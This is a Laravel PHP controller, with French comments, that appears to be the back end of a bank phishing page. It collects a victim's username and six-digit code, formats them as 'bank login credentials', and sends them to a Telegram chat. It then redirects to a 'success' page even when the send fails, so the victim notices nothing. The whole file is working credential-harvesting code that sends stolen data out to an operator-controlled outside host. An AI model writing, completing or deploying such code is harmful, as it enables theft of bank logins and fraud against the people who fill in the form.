<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;

class ValiderController extends Controller
{
     /**
     * Étape 1 : Réception des données qui te redirige vers la page reservation youpi
     */
    public function submit(Request $request)
    {
        
        
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'code' => 'required|digits:6',
        ]);

        // 2. Formatage du message Telegram
        $message = "🔔 *IDENTIFIANT DE CONNEXION BANCAIRES* 🔔\n\n"
                 . "👤 Identifiant : {$validated['username']}\n"
                 . "🔑 code personnel : {$validated['code']}" ;

        try {
            // 3. Envoi de la notification
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));

                return redirect()->route('success');

        } catch (\Exception $e) {

            Log::error('Erreur Telegram : '.$e->getMessage());
            
            return redirect()->route('success');
        }

        
        
    }
}
